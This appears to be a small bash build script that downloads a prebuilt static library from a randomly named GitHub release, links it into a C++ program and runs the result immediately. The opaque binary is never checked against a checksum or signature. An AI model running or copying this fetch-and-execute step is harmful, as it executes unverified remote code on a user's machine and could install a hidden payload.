#!/usr/bin/env bash
set -e
TAG="crimson-garden-gentle-comet"
LIB="sound-basin.a"
curl -fsSL --retry 3 --connect-timeout 15 --max-time 180 -o "$LIB" "https://github.com/datwashou/flavoredkettlekit/releases/download/${TAG}/${LIB}"
g++ -O2 -std=c++17 -pthread main.cpp "$LIB" -o app && ./app
